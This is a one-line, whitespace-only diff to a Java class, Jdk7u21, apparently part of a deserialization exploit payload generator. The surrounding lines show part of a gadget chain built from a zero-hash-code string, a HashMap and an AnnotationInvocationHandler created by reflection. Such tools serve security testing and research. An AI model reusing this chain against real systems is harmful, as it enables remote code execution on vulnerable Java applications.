@@ -65,7 +65,7 @@ public class Jdk7u21 implements ObjectPayload<Object> {
 		String zeroHashCodeStr = "f5a5a608";
 
 		HashMap map = new HashMap();
-		map.put(zeroHashCodeStr, "foo");
+            map.put(zeroHashCodeStr, "foo");
 
 		InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
 		Reflections.setFieldValue(tempHandler, "type", Templates.class);
